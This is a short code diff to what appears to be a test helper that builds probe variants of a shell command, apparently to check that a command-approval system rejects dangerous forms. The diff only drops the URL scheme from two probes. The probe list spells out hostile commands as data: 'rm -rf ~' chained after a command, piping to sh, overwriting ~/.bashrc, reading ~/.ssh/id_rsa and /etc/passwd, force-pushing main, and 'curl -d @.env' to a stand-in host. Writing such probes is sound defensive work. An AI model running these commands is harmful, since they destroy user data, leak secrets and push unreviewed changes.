@@ -77,10 +77,10 @@ export function projectOf(cwd) {
 const PROBES = s => {
   const last = s.split(/\s+/).at(-1);
   return [`${s} --force`, `${s} -rf /`, `${s} --prod`, `${s} --config=/etc/x`, `${s} && rm -rf ~`, `${s}; rm -rf ~`, `${s} | sh`,
-    `${s} > ~/.bashrc`, `${s} $(curl -s https://x.invalid)`, `sudo ${s}`, `FOO=1 ${s}`, `cd / && ${s}`,
+    `${s} > ~/.bashrc`, `${s} $(curl -s x.invalid)`, `sudo ${s}`, `FOO=1 ${s}`, `cd / && ${s}`,
     s.replace(new RegExp(`${esc(last)}$`), "-rf"), s.replace(new RegExp(`${esc(last)}$`), "../../x"), s.replace(new RegExp(`${esc(last)}$`), "/etc/passwd"),
     s.replace(new RegExp(`${esc(last)}$`), "~/.ssh/id_rsa"), "npm run build; rm -rf ~", "make deploy", "npm publish", "git push --force origin main",
-    "curl -d @.env https://x.invalid", "rm -rf ~"];
+    "curl -d @.env x.invalid", "rm -rf ~"];
 };
 
 // templateOf reasons, summed up for the "left alone" counts.
